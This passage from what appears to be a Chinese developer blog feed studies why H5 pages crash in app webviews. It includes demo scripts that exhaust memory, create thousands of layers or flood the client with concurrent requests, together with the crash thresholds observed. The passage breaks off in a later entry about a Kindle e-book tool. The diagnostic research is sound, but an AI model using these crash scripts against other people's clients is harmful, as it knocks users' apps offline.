title="H5 Crash 原因初探"></a>H5 Crash 原因初探</h3><p>测试代码 <a href="//github.com/barretlee/h5crash.git">仓库地址</a>：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> //github.com/barretlee/h5crash.git;</span><br><span class="line"><span class="built_in">cd</span> demo;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong> 代码需要在 Webview 容器中测试，PC 浏览器下不会出现异常。</p><p>H5 Crash 的原因不太明显，但是从经验上判断和摸索，大致归类为以下三种：</p><p><strong>1. 内存问题</strong></p><ul><li>测试方法：使用闭包，不断增加内存量，看看增加到哪个区间大小， webview 容器会出现异常</li><li>测试地址：<a href="http://rawgit.com/barretlee/h5crash/master/demo/crash-memory.html">http://rawgit.com/barretlee/h5crash/master/demo/crash-memory.html</a>（微信、微博或者其他客户端打开该页面的用户，可以点进去测试下，选择 100M 内存，不出意外，你的客户端会闪退。）</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> <span class="title class_">Closure</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> _cache = [];</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> cache = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> add = <span class="keyword">function</span>(<span class="params">size</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    cache += size;</span></span><br><span class="line"><span class="language-javascript">    size = size * <span class="number">1024</span> * <span class="number">1024</span>;</span></span><br><span class="line"><span class="language-javascript">    _cache.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Array</span>(size).<span class="title function_">join</span>(<span class="string">&#x27;x&#x27;</span>));</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">refresh</span>();</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> refresh = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    r.<span class="property">innerHTML</span> = <span class="string">&#x27;内存消耗： &#x27;</span> + cache + <span class="string">&#x27;M&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">cache</span>: cache + <span class="string">&#x27;M&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">add</span>: add,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">refresh</span>: refresh</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> closure = <span class="title class_">Closure</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;closure.add(1)&quot;</span>&gt;</span>增加 1M 内存消耗<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;closure.add(10)&quot;</span>&gt;</span>增加 10M 内存消耗<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;closure.add(20)&quot;</span>&gt;</span>增加 20M 内存消耗<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;closure.add(50)&quot;</span>&gt;</span>增加 50M 内存消耗<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;closure.add(100)&quot;</span>&gt;</span>增加 100M 内存消耗<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;r&quot;</span>&gt;</span>内存消耗：0 M<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>存在的干扰：这种测试存在比较多的干扰，比如设备类型、系统类型（iOS&#x2F;Android)、和设备内存运行状态等。</li></ul><p><strong>2. Layers 数问题</strong></p><p>Layers 数的获取比较麻烦，Chrome Driver 没有提供该数据的接口，目前也没有比较好的办法拿到这个数据。</p><ul><li>测试方法：通过不同的方式创建层，观察页面的 Crash 情况</li><li>测试地址：<a href="http://rawgit.com/barretlee/h5crash/master/demo/crash-layer.html">http://rawgit.com/barretlee/h5crash/master/demo/crash-layer.html</a></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-class">.transform</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">transform</span>: <span class="built_in">translateZ</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.animation</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>:<span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>:<span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background</span>:red;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">position</span>:relative;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">animation</span>:move <span class="number">5s</span> infinite;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="keyword">@keyframes</span> move &#123;</span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">from</span> &#123;<span class="attribute">left</span>:<span class="number">0px</span>;&#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">to</span> &#123;<span class="attribute">left</span>:<span class="number">200px</span>;&#125;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> <span class="title class_">Layer</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">getType</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;input:checked&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">createOne</span>: <span class="keyword">function</span>(<span class="params">index</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      div.<span class="title function_">appendChild</span>(<span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(index));</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">switch</span>(<span class="title function_">getType</span>()) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">case</span> <span class="string">&#x27;opacity&#x27;</span>:</span></span><br><span class="line"><span class="language-javascript">          div.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&quot;opacity:&quot;</span> + (index / <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">case</span>  <span class="string">&#x27;transform&#x27;</span>:</span></span><br><span class="line"><span class="language-javascript">          div.<span class="property">className</span> = <span class="string">&#x27;transform&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">case</span>  <span class="string">&#x27;animation&#x27;</span>:</span></span><br><span class="line"><span class="language-javascript">          div.<span class="property">className</span> = <span class="string">&#x27;animation&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">case</span>  <span class="string">&#x27;zindex&#x27;</span>:</span></span><br><span class="line"><span class="language-javascript">          div.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&quot;position:relative; z-index:&quot;</span> + index;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(div);</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">create</span>: <span class="keyword">function</span>(<span class="params">num</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      [].<span class="property">slice</span>.<span class="title function_">call</span>(<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;div&#x27;</span>)).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">item</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        item.<span class="property">parentNode</span> &amp;&amp; item.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(item);</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">while</span>(num--) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">createOne</span>(num);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> layer = <span class="title class_">Layer</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>层类型: <span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">checked</span> <span class="attr">name</span>=<span class="string">&quot;type&quot;</span> <span class="attr">value</span>=<span class="string">&quot;opacity&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span>&gt;</span>通过 opacity 创建层<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;type&quot;</span> <span class="attr">value</span>=<span class="string">&quot;transform&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span>&gt;</span>通过 transforms 创建层<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;type&quot;</span> <span class="attr">value</span>=<span class="string">&quot;animation&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span>&gt;</span>通过 animation 创建层<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;type&quot;</span> <span class="attr">value</span>=<span class="string">&quot;zindex&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span>&gt;</span>通过绝对定位分层<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;layer.create(1)&quot;</span>&gt;</span>创建 1 个层<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;layer.create(10)&quot;</span>&gt;</span>创建 10 个层<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;layer.create(20)&quot;</span>&gt;</span>创建 20 个层<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;layer.create(50)&quot;</span>&gt;</span>创建 50 个层<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;layer.create(100)&quot;</span>&gt;</span>创建 100 个层<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;layer.create(200)&quot;</span>&gt;</span>创建 200 个层<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;layer.create(500)&quot;</span>&gt;</span>创建 500 个层<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;layer.create(1000)&quot;</span>&gt;</span>创建 1000 个层<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;layer.create(2000)&quot;</span>&gt;</span>创建 2000 个层<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;layer.create(5000)&quot;</span>&gt;</span>创建 5000 个层<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;layer.create(10000)&quot;</span>&gt;</span>创建 10000 个层<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>实际上，创建多个层，也是对内存的巨大消耗，页面 Crash 可能还是因为内存消耗过大</li></ul><p><strong>3. 并发过多问题</strong></p><ul><li>测试方法：尝试并发发出多种不同的请求（Fetch请求、XHR 请求、Script&#x2F;CSS 资源请求），观察页面 Crash 情况</li><li>测试地址：<a href="http://rawgit.com/barretlee/h5crash/master/demo/crash-request.html">http://rawgit.com/barretlee/h5crash/master/demo/crash-request.html</a></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> <span class="title class_">Request</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">getType</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;input:checked&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">getResource</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> type = <span class="title function_">getType</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> resource = &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">fetch</span>: <span class="string">&#x27;/&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">xhr</span>: <span class="string">&#x27;/&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">script</span>: <span class="string">&#x27;//g.alicdn.com/sd/data_sufei/1.5.1/aplus/index.js&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">css</span>: <span class="string">&#x27;//g.alicdn.com/kg/global-util/1.0.3/index-min.css&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> resource[type];</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">emitOne</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> url = <span class="title function_">getResource</span>() + <span class="string">&quot;?_t=&quot;</span> + (<span class="keyword">new</span> <span class="title class_">Date</span> * <span class="number">1</span> + <span class="title class_">Math</span>.<span class="title function_">random</span>());</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">switch</span>(<span class="title function_">getType</span>()) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">case</span> <span class="string">&#x27;fetch&#x27;</span>:</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">case</span> <span class="string">&#x27;xhr&#x27;</span>:</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">with</span>(<span class="params"><span class="keyword">new</span> XMLHttpRequest</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, url);</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">case</span> <span class="string">&#x27;script&#x27;</span>:</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">          s.<span class="property">src</span> = url;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">case</span> <span class="string">&#x27;css&#x27;</span>:</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;link&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">          s.<span class="property">href</span> = url;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">emit</span>: <span class="keyword">function</span>(<span class="params">num</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      [].<span class="property">slice</span>.<span class="title function_">call</span>(<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;script,link&#x27;</span>)).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">item</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        item.<span class="property">parentNode</span> &amp;&amp; item.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(item);</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">while</span>(num--) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="title function_">emitOne</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> request = <span class="title class_">Request</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>请求类型: <span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">checked</span> <span class="attr">name</span>=<span class="string">&quot;type&quot;</span> <span class="attr">value</span>=<span class="string">&quot;fetch&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span>&gt;</span>使用 Fetch 发送请求<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;type&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xhr&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span>&gt;</span>使用 XHR 发送请求<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;type&quot;</span> <span class="attr">value</span>=<span class="string">&quot;script&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span>&gt;</span>并发请求脚本资源<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;type&quot;</span> <span class="attr">value</span>=<span class="string">&quot;css&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span>&gt;</span>并发请求样式资源<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;request.emit(1)&quot;</span>&gt;</span>并发 1 个请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;request.emit(10)&quot;</span>&gt;</span>并发 10 个请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;request.emit(20)&quot;</span>&gt;</span>并发 20 个请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;request.emit(50)&quot;</span>&gt;</span>并发 50 个请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;request.emit(100)&quot;</span>&gt;</span>并发 100 个请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;request.emit(500)&quot;</span>&gt;</span>并发 500 个请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;request.emit(1000)&quot;</span>&gt;</span>并发 1000 个请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>存在的干扰：设备的种类、设备的 CPU 使用情况和网络状况等。</li></ul><h3 id="H5-Crash-测试结果"><a href="#H5-Crash-测试结果" class="headerlink" title="H5 Crash 测试结果"></a>H5 Crash 测试结果</h3><p><strong>测试结果：</strong></p><ul><li>通过 opacity、animation、positon 等方式创建层，即便是 1w 个，页面也没有明显变化；但是使用 transform 创建 2k~5k 个层，页面会卡顿几秒后立即闪退；</li><li>内存是条红线，测试发现，一次性消耗 20M 的内存，会导致客户端立即闪退；</li><li>并发请求也是存在响应问题的，Fetch API 和 CSS Resource 并发 1k 请求没有出现问题，但是 XHR 和 Script Resource 请求，问题特别明显，虽然没有导致页面闪退，但是页面已经进入了假死状态。</li></ul><p>以上临界值还可以继续精确。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文主要是对 H5 Crash 做了一个预研，测试可能存在诸多误差，测试方法也需要改进，不过沿着这些的思路考究会比较容易找到结论。</p><p>后续会给出比较有意义的边界数据以及探测工具。</p>]]></content>
      
      
      <categories>
          
          <category> 无线技术 </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H5 </tag>
            
            <tag> 无线 </tag>
            
            <tag> Crash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kindle 电子书生成工具</title>
      <link href="/blog/2016/05/20/kindle-book-maker/"/>
      <url>/blog/2016/05/20/kindle-book-maker/</url>
      
        <content type="html"><![CDATA[<blockquote><p>花了两个晚上把 OPF 和 epub 格式整明白了，准备把订阅的 RSS 内容抓取下来做成电子书推到 kindle 中阅读。后续也会把自己博客整成电子书，提供给习惯 kindle 阅读的朋友。研究这些东西目的还是想回到比较纯粹的阅读设备上，毕竟手机屏小干扰多，看久了眼睛也有点不舒服。</p></blockquote><p>本项目旨在写一个 Kindle 电子书的构建工具，从互联网上抓取数据，合并整合都生成一本小巧的 <code>.mobi</code> 电子书。而使用这个工具，你只需要编辑下配置文件，或者直接运行命令行工具。</p><ul><li>项目地址：<a href="http://github.com/barretlee/kindleBookMaker">http://github.com/barretlee/kindleBookMaker</a></li><li>基本原理：根据 OPF 规范生成 KF8 格式的 <code>.mobi</code> 电子书</li></ul><span id="more"></span><p><s><strong>注意：</strong> 项目中提供的 <a href="//github.com/barretlee/kindleBookMaker/blob/master/bin/kindlegen">&#x2F;bin&#x2F;kindlegen</a> 文件只适用于 Mac 系统，如果您使用的是 windows，需要在这里下载对应的 <a href="http://www.amazon.com/gp/feature.html?docId=1000765211">kindleGen</a>，并替换本项目中的文件。</s>  感谢 <a href="//github.com/hillwah">hillwah</a> 的 PR，帮我添加了对其他平台的支持。</p><h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3><p>数据有这么几个来源：</p><ul><li>通过抓取单个 uri 的内容，配合 title 和 content DOM 选择器，获取文章的标题和内容</li><li>通过抓取 RSS 源获取内容</li><li>使用本地数据，比如 hexo build 目录下的 html 文件</li></ul><p>下图为该工具的一个结构图： </p><p><img src="/../blogimgs/2016/05/20/TB1B_rJJVXXXXcvXXXXXXXXXXXX-809-584.png" alt="Kindle Book Maker"><!--<source src="https://img.alicdn.com/tfs/TB1B_rJJVXXXXcvXXXXXXXXXXXX-809-584.png">--></p><p>抓到数据后，工具会帮助分析过滤数据，尤其对 hexo 生成的文件做了特殊的处理，后续也会添加几个扩展功能（比如之间转换 markdown 文件），如果 html 中包含了远程内容——CSS、图片等——程序会全部抓取过来。</p><p>最后，使用官方提供了 <a href="http://www.amazon.com/gp/feature.html?docId=1000765211">kindleGen</a> 